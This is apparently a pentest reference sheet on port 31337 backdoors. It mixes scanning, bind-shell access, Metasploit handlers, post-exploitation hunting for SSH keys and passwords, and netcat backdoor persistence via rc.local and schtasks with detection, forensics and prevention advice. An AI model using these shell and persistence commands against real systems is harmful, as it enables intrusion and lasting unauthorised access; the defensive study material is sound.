# ELITE BACKDOOR ENUMERATION (Port 31337/TCP)

## SERVICE OVERVIEW
```
Port 31337/TCP - "Elite" or "1337" (leet) backdoor port
- Classic backdoor port (31337 = "elite" in leet speak)
- Used by various trojans and RATs historically
- Back Orifice trojan default port
- Common bind shell port
- May indicate compromised system
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p31337 <IP>                           # Service/Version detection
nc -nv <IP> 31337                               # Manual connection
telnet <IP> 31337                               # Alternative connection
```

## NMAP ENUMERATION
```bash
# Basic scan
nmap -sV -p31337 <IP>                           # Version detection
nmap -p31337 --script banner <IP>               # Banner grab

# Check for Back Orifice
nmap -p31337 --script backdoor-check <IP>
nmap -p31337 -sU <IP>                           # Back Orifice uses UDP

# Comprehensive backdoor scan
nmap -sV -p31337,12345,12346,20034,27374,6667 <IP> -oA elite_backdoor_scan
```

## HISTORICAL TROJANS ON PORT 31337
```
1. Back Orifice (BO) - 1998
   - Port: 31337/UDP (default)
   - Remote administration trojan (RAT)
   - Windows backdoor

2. DeepThroat - 1999
   - Port: 31337/TCP
   - Remote access trojan

3. Baron Night - 2000s
   - Port: 31337/TCP
   - Backdoor trojan

4. Modern usage:
   - Custom bind shells (Metasploit, netcat)
   - Reverse shells
   - C&C for custom malware
```

## BACK ORIFICE DETECTION
```bash
# Back Orifice uses UDP on 31337 (default)
nmap -sU -p31337 <IP>                           # UDP scan

# Send Back Orifice packet
# BO magic: "*!*QWTY?" (encrypted header)

# BO scanner (legacy tool)
# bo-scan <IP>

# Modern detection is rare (ancient trojan)
```

## BIND SHELL EXPLOITATION
```bash
# If port 31337 is OPEN (listening), likely a bind shell

# Connect with netcat
nc -nv <IP> 31337
rlwrap nc -nv <IP> 31337                        # With readline support

# Test for shell
whoami
id
uname -a

# Windows shell
whoami
ipconfig
net user

# Linux shell
whoami
id
uname -a
pwd
```

## UPGRADE TO INTERACTIVE SHELL
```bash
# Linux shell upgrade

# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Stabilize shell
# Ctrl+Z (background)
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Script command (alternative)
script /dev/null -c bash
```

## METASPLOIT PAYLOADS
```bash
# Common payloads using port 31337:

msfconsole
use exploit/multi/handler

# Linux bind shell
set PAYLOAD linux/x86/shell/bind_tcp
set RHOST <target_IP>
set LPORT 31337
exploit

# Windows bind shell
set PAYLOAD windows/shell/bind_tcp
set RHOST <target_IP>
set LPORT 31337
exploit

# Meterpreter bind shell
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST <target_IP>
set LPORT 31337
exploit
```

## REVERSE SHELL (IF LISTENER)
```bash
# If you're the attacker setting up listener on 31337:

# Netcat listener
nc -lvnp 31337

# Metasploit multi/handler
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 31337
exploit -j
```

## POST-EXPLOITATION
```bash
# After connecting to bind shell:

# System enumeration
whoami && id                                    # Current user
hostname                                        # Hostname
uname -a                                        # Kernel version (Linux)
systeminfo                                      # System info (Windows)

# Network enumeration
ip a                                            # Linux network interfaces
ipconfig /all                                   # Windows network config
netstat -ano                                    # Network connections

# User enumeration
cat /etc/passwd                                 # Linux users
net user                                        # Windows users
w                                               # Who's logged in (Linux)
quser                                           # Who's logged in (Windows)

# Privilege check
sudo -l                                         # Linux sudo permissions
whoami /priv                                    # Windows privileges

# Find sensitive files
find / -name "*.conf" 2>/dev/null
find /home -name "id_rsa" 2>/dev/null
dir C:\ /s /b | findstr /i "password config backup"
```

## COMMON MISCONFIGURATIONS
```
☐ Backdoor left running from previous compromise
☐ No firewall blocking port 31337
☐ Bind shell accessible from internet
☐ No IDS/IPS detecting backdoor traffic
☐ Elite port used (easily detected by defenders)
☐ No process monitoring for suspicious listeners
☐ Compromised system not detected/remediated
☐ No network segmentation
```

## QUICK WIN CHECKLIST
```
☐ Scan for port 31337 (TCP and UDP)
☐ Attempt to connect with netcat
☐ Test for shell access (whoami, id, etc.)
☐ Upgrade to interactive shell
☐ Enumerate system (OS, users, network)
☐ Check for privilege escalation vectors
☐ Identify backdoor type (netcat, Metasploit, trojan)
☐ Document indicators of compromise (IOC)
☐ Investigate how backdoor was installed
☐ Remove backdoor and patch vulnerability
```

## ONE-LINER CONNECTION
```bash
# Quick connection test
echo "whoami" | nc -nv <IP> 31337

# Interactive connection
rlwrap nc -nv <IP> 31337
```

## SECURITY IMPLICATIONS
```
RISKS:
- Active backdoor on system (critical!)
- Unauthorized remote access
- Data exfiltration
- Lateral movement
- Persistence mechanism
- Compromised credentials
- Ongoing attack in progress

INDICATORS OF COMPROMISE:
- Port 31337 listening (TCP or UDP)
- Suspicious processes (nc, ncat, perl, python with network)
- Outbound connections to suspicious IPs
- Modified system files
- New user accounts
- Suspicious scheduled tasks/cron jobs
- Unknown binaries in /tmp or C:\Windows\Temp

IMMEDIATE ACTIONS:
- Isolate affected system from network
- Kill suspicious processes
- Check all running processes and network connections
- Review system logs for entry point
- Identify scope of compromise
- Change all credentials
- Restore from known good backup
- Conduct full forensic analysis
- Implement EDR/XDR solution
```

## DEFENSIVE DETECTION
```bash
# Check for port 31337 listener (Linux):
netstat -tulpn | grep 31337
ss -tulpn | grep 31337
lsof -i :31337

# Check process listening on 31337
lsof -i :31337 -t                               # Get PID
ps aux | grep $(lsof -i :31337 -t)             # Process details

# Check for suspicious processes
ps aux | grep -E "nc|ncat|netcat|perl|python|bash.*-i"
ps aux | grep -i backdoor

# Check for outbound connections
netstat -anp | grep ESTABLISHED
ss -tnp | grep ESTABLISHED

# Kill backdoor process
kill -9 $(lsof -i :31337 -t)

# Windows:
netstat -ano | findstr 31337
tasklist | findstr <PID>
taskkill /F /PID <PID>
```

## FORENSICS & INVESTIGATION
```bash
# If you find port 31337 open:

# 1. Identify process
lsof -i :31337
netstat -tulpn | grep 31337

# 2. Check process details
ps aux | grep <PID>
ls -l /proc/<PID>/exe                           # Binary location
cat /proc/<PID>/cmdline                         # Command line
ls -l /proc/<PID>/fd/                           # File descriptors
cat /proc/<PID>/environ                         # Environment variables

# 3. Check when process started
stat /proc/<PID>
ps -o lstart,cmd -p <PID>

# 4. Check network connections
lsof -p <PID> -i
netstat -anp | grep <PID>

# 5. Dump process memory
gcore <PID>                                     # Create core dump
strings core.<PID> | grep -E "password|key|secret"

# 6. Kill and remove
kill -9 <PID>
rm /path/to/backdoor

# 7. Check persistence
cat /etc/rc.local
crontab -l
ls /etc/systemd/system/
cat ~/.bashrc
cat ~/.bash_profile
```

## PREVENTION
```
- Implement egress filtering (block outbound 31337)
- Use IDS/IPS to detect bind shell patterns
- Monitor for processes listening on unusual ports
- Baseline normal network behavior
- Regular vulnerability scanning
- Patch management
- Application whitelisting
- Network segmentation
- Security awareness training
- Incident response plan
- EDR (Endpoint Detection and Response)
- SIEM with alerting on port 31337 activity
```

## RELATED BACKDOOR PORTS
```
31337 - Elite (1337) ← THIS PORT
4444  - Metasploit default
4445  - Metasploit alternative
5555  - Common backdoor / ADB
6666  - Common backdoor
8080  - HTTP backdoor
9999  - Common backdoor
12345 - NetBus trojan
12346 - NetBus trojan alternative
20034 - NetBus Pro
27374 - SubSeven trojan
65535 - RC5/RC6 backdoors
```

## TOOLS
```bash
# Netcat
nc -nv <IP> 31337
rlwrap nc -nv <IP> 31337

# Nmap
nmap -sV -p31337 <IP>
nmap -sU -p31337 <IP>                           # UDP (Back Orifice)

# Metasploit
use exploit/multi/handler
set PAYLOAD <payload>
set LPORT 31337
exploit

# Forensics
lsof -i :31337
netstat -tulpn | grep 31337
```

## LEET SPEAK CONTEXT
```
31337 = ELITE (E=3, L=1, I=1, T=7, E=3)

Other leet ports sometimes used:
1337  - "Leet"
31337 - "Elite" (most common)
31338 - "Elite" alternative
31339 - "Elite" alternative

Historical significance:
- Hacker culture from 1980s-1990s
- Replaced letters with numbers
- Port 31337 became iconic for backdoors
- Still used by attackers for nostalgia/tradition
- Easily detected by modern security tools
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Initial compromise
# - Exploit vulnerability (web app, SMB, etc.)
# - Phishing with malicious payload
# - Social engineering

# 2. Create backdoor on port 31337
nc -lvnp 31337 -e /bin/bash                     # Linux bind shell
nc -lvnp 31337 -e cmd.exe                       # Windows bind shell

# 3. Persistence
echo "nc -lvnp 31337 -e /bin/bash" > /etc/rc.local  # Linux
schtasks /create /tn "Elite" /tr "nc -lvnp 31337 -e cmd.exe" /sc onstart  # Windows

# 4. Discovery from attacker
nmap -p31337 <subnet>

# 5. Connect to backdoor
nc -nv <target_IP> 31337

# 6. Post-exploitation
# - Enumerate system
# - Escalate privileges
# - Lateral movement
# - Data exfiltration
```
